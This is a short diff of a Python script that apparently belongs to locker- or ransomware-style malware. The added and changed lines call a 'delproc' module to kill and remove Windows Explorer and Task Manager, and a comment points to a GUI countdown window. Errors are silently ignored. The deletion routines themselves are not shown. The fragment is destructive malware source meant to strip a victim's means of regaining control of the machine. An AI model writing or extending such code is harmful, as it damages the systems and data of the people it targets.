@@ -10,11 +10,12 @@ usr = os.environ["USERNAME"]
 d = os.environ["SystemDrive"]
 # INIT VARIABLE FROM CLASS
 dk = delproc.Kill()
+dr = delproc.Remove()
 # TRY TO REMOVE EXPLORER IF NOT DELETED BEFORE
 try:
     dk.exp()
-    delproc.exp()
-    delproc.tskmgr()
+    dr.exp()
+    dr.tskmgr()
 except:
     pass
 # INIT WINDOW FOR GUI COUNTER
